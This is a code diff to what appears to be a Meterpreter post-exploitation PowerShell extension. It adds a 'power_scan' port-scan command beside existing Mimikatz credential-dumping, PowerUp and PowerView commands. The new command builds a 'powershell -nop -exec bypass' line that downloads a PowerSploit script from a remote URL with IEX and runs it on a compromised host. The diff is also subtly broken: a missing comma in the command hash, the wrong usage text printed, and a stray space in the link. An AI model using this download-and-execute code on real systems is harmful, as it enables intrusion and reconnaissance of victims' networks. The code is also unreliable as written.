@@ -26,6 +26,7 @@ class Console::CommandDispatcher::Priv::PowerShell
       "power_view"  => "Download and execute Veil's PowerView Framework",
       "power_up"    => "Download and execute the PowerUp Framework",
       "power_katz"  => "Invoke-Mimikatz into memory using PowerShell"
+      "power_scan"  => "Invoke-PortScan from meterpreter using PowerShell"
     }
   end
 
@@ -103,6 +104,23 @@ Note: Works on anything Windows 8.1 and higher. For now, migrate into appropriat
 > power_katz -DumpCreds -ComputerName @("computer1", "computer2")
   => Runs against multiple targets
 }
+
+POWER_SCAN_USAGE = %q{
+Powershell Invoke-Portscan from Memory
+=============================
+Desc: This is a loose implementation of nmap using powershell.
+Ref:  https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1
+
+== Commands ==
+> power_scan -hosts (Comma seperated) -ports -PingOnly -Threads -oN file
+  => Performs a basic scan and outputs to file
+
+}
+
+
+
+
+
 
   POWER_UP_USAGE = %q{
 Harmj0y PowerUp Utility
@@ -298,6 +316,26 @@ Ref: https://github.com/HarmJ0y/PowerUp
     ps_exec(command, tmp_file, c_time, output_file)
     return true        
   end
+ 
+  
+  #
+  # PowerShell Portscan using Powersploit
+  #  https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1
+    def cmd_power_scan(*args)
+    link = ' https://raw.githubusercontent.com/syphersec/PowerSploit/master/Recon/Invoke-Portscan.ps1'
+    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+      print_line(POWER_KATZ_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_scan -Hosts/-HostsFile -Ports/-PortsFile/-topPorts -threads -oA file \n" +
+            "A nmap style implementation in powershell.\n" +
+            @@command_opts.usage)
+      return true
+    end
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Portscan #{ps_cmd}\" >> #{tmp_file}"
+    ps_exec(command, tmp_file, c_time, output_file)
+    return true            
+  end
+
 
   #
   # PowerShell Mimikatz
